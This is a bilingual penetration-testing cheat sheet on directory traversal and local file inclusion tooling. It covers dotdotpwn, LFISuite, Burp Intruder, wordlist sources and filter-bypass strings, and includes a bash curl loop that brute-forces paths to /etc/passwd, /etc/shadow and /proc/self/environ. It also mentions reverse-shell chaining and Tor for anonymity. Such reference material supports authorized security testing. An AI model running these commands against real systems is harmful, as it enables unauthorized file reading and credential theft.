---
aliases:
  - dotdotpwn
  - LFISuite
  - Path Traversal Wordlists
tags:
  - type/cheatsheet
  - vuln/path-traversal
  - technique/discovery
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Directory Traversal]]'
  - '[[Burp Suite]]'
---
# Directory Traversal - Tooling

***

## dotdotpwn

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Repo | `git clone https://github.com/wireghoul/dotdotpwn` | Perl-based fuzzer. |
| HTTP fuzz | `dotdotpwn.pl -m http -h target.com -f /etc/passwd -k root:` | URL fuzz con traversal. |
| FTP fuzz | `dotdotpwn.pl -m ftp -h target.com -u user -p pass -f /etc/passwd` | FTP traversal. |
| TFTP fuzz | `dotdotpwn.pl -m tftp -h target.com -f /etc/passwd` | TFTP. |
| Output verbose | `-v` | Debug. |
| Custom port | `-x 8080` | Custom port. |
| Quiet mode | `-q` | Less output. |
| Detect OS | `-O` | Auto OS detection. |
| Specify depth | `-d 8` | Traversal depth. |
| Bisection | `-b` | Auto-find length. |
| `-f` para file | Path objetivo | Standard. |
| `-k` keyword | Match keyword in response → success | Confirms read. |
| Full path generation | `-d 5 -f /etc/passwd` generates `../../../../etc/passwd`, etc | Bulk generation. |
| Stand-alone payload generator | Use `dotdotpwn.pl -m stdout -d 8 -f /etc/passwd > paths.txt` | For Burp Intruder. |
^pt-tool-dotdotpwn

___

## LFISuite

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Repo | `git clone https://github.com/D35m0nd142/LFISuite` | Python — auto-exploit + scanner. |
| Run interactive | `python LFISuite.py` | Menu-driven. |
| Scanner mode | `python LFISuite.py -t target.com -P /vuln.php` | Auto-scan. |
| Specific URL | `-u https://target/page?file=` | Direct URL. |
| Auto-exploit | Built-in shells (PHP, Perl, etc) | Direct RCE attempt. |
| Reverse shell | Drops own shell con LFI to log poisoning chain | Standard chain. |
| Tor support | `-T` flag | Anonymity. |
| Cookie support | `-c "session=..."` | Authenticated. |
| Custom shells | Edit `shells.php` con own payload | Customizable. |
| Stack detection | Identifies PHP / Java / etc backend | Auto. |
| Verbose | `-v` | Debug. |
| Multi-payload | Probes con multiple bypasses | Comprehensive. |
^pt-tool-lfisuite

___

## Burp Intruder + Wordlists

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Mark position | `?file=§...§` en Intruder | Standard position. |
| Load wordlist | PayloadsAllTheThings/Directory Traversal | Standard. |
| Sniper mode | Single position, multiple payloads | Default. |
| Battering ram | Same payload all positions | Less common for traversal. |
| Pitchfork | Multi-position synced | Combo. |
| Cluster bomb | Multi-position cartesian | Heavy fuzzing. |
| Match conditions | Grep extract `root:`, `[boot loader]`, etc | Match indicators. |
| Negative match | Ignore `404`, `403` responses | Filter. |
| Length-based | Sort by Length column | Visual diff. |
| Status code | Filter 200 only | Standard. |
| Time-based | Sort by response time | Slow = read OK. |
| Resource pool | Set rate limit | Avoid 429. |
| Settings → "Update Content-Length" | Auto-recalc | Required for body fuzz. |
| Custom Iterator | Generate paths dynamically | Edge. |
^pt-tool-burp

___

## Wordlists Recomendadas

| **Wordlist** | **Path / Repo** | **Uso** |
|:---:|:---:|:---:|
| PayloadsAllTheThings - Directory Traversal | `PayloadsAllTheThings/Directory Traversal/Intruder/` | Standard. |
| SecLists - LFI | `SecLists/Fuzzing/LFI/` | Comprehensive. |
| LFI-Payload-List (Brian Frichette) | https://github.com/brian-frichette/another-LFI-payload-list | Alternative. |
| FuzzDB - LFI | `FuzzDB/attack/lfi/` | Old but solid. |
| Custom paths.txt | Generate con dotdotpwn `-m stdout` | Custom-tailored. |
| Top common files | `passwd`, `win.ini`, `hosts`, `httpd.conf`, `web.config` | Top targets. |
| PHP wrapper list | `php://filter/...`, `data://`, `expect://` | PHP-specific. |
| Bypass list | `....//`, `..;/`, encoded variants | Filter bypass. |
| Linux paths wordlist | `/etc/`, `/var/log/`, `/proc/self/` | Linux focus. |
| Windows paths wordlist | `C:\\windows\\`, `C:\\inetpub\\` | Windows focus. |
| Nullbyte payloads | All paths con `%00.txt` suffix | Pre-PHP 5.3.4. |
^pt-tool-wordlists

### Manual one-liner

```bash
# Generate traversal paths (8 levels) + targets
for depth in 1 2 3 4 5 6 7 8; do
  PREFIX=$(printf '../%.0s' $(seq 1 $depth))
  for file in 'etc/passwd' 'etc/shadow' 'proc/self/environ' 'windows/win.ini'; do
    echo "${PREFIX}${file}"
  done
done > paths.txt

# Brute force con curl
while read p; do
  ENCODED=$(printf '%s' "$p" | jq -sRr @uri)
  R=$(curl -s "https://target/api/file?path=$ENCODED")
  if echo "$R" | grep -qE 'root:|\[fonts\]|PATH='; then
    echo "[+] $p → MATCH"
  fi
done < paths.txt
```

___

## Custom Scripts

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ffuf` traversal | `ffuf -u "https://target/api/file?path=FUZZ" -w paths.txt -mr 'root:'` | Match regex root. |
| `wfuzz` LFI | `wfuzz -c -z file,paths.txt --hh 0 https://target/?file=FUZZ` | Hide hash 0 (404). |
| `gobuster` LFI mode | `gobuster fuzz -u 'https://target/?file=FUZZ' -w paths.txt` | Modern fuzzer. |
| Python scripts | Custom requests + match | Programmable. |
| Bash one-liner | Already shown | Quick. |
| nuclei templates | `nuclei -t cves/2021/CVE-2021-41773.yaml` | CVE-specific. |
| Apache LFI nuclei | Hundreds of templates | Auto-scan. |
| Burp BApp Store | "LFI Scanner" extension | Burp ext. |
| OWASP ZAP | Built-in active scanner | Free alternative. |
^pt-tool-custom

***
